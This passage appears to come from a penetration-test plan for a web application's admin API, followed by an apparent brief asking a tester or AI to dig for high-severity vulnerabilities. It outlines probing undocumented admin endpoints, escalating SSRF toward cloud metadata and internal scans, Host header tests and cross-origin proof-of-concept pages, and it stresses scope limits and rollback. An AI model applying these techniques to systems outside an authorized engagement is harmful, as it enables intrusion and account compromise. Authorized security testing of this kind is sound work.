+- Tokens must never appear in URLs.
+- `state` parameter must be unguessable and not reused.
+- Check if any admin links (e.g., approval callbacks in the deletion-request workflow) carry tokens or session identifiers in query strings.
+
+### 5.20 Undiscovered API Surface
+
+`/admin/docs/` returned 200. Parse it.
+
+Probe undocumented admin endpoints:
+
+- `/admin/api/webhooks`, `/admin/api/notifications`, `/admin/api/events`.
+- `/admin/api/backup`, `/admin/api/export`, `/admin/api/import`.
+- `/admin/api/email-templates`.
+- `/admin/api/deletion-requests/:id` with PUT / POST (approval flow).
+
+Use OPTIONS to discover methods before probing destructive verbs.
+
+---
+
+## Execution Notes
+
+- **OAST discipline**: one canary per field. Labels in the canary help attribute callbacks when multiple flows run in parallel.
+- **SSRF escalation**: test blind first (OAST callback only). Only escalate to cloud metadata and internal scans after the primary callback is confirmed — and only when engagement scope permits.
+- **Host header tests** may be constrained by any reverse proxy or load balancer in front of the server — if the system ships behind a LB, the LB may strip or normalize the header, and the SSRF-level tests need to target the direct backend.
+- **Settings SSRF rollback**: after each `theme_*` / `smtp_host` write, restore the original value.
+- **Debug-endpoint probing is mostly safe** — its GETs. But `/debug/pprof/*` profiling endpoints can be expensive; rate-limit yourself.
+- **Cross-origin proofs-of-concept**: for the confirmed chains in 5.9, a tiny HTML page hosted somewhere the user can load in a browser is the clearest demonstration. Dont email or publicly host it; share it locally.
+- **Discovery document**: hit it once at the start of the run and compare at the end. If it changes, something about the environment shifted mid-test.
+```
+
+-------------------
+
+Findings were discovered from this testing, however almost all of them have been addressed by the service. Your goal is to go even deeper. Use non-trivial and novel techniques to try and discover high or critical severity vulnerabilities in this application.
+
+The proxy history contains logging in under the admin and reviewing and using all functionality within the service. Review what has been done, the APIs presented, and the service design in general. Remaining issues will require multiple steps, often an exploit of the service design (for example mutable emails not requiring MFA was the most recent finding, allowing account takeover with a token). Build a plan and execute to dive deeper into this service and find non-trivial but high impact security issues.
+
+Please only elevate validated security issues which have a significant exposure to the integrity or privacy of a users account under realistic attack scenarios.
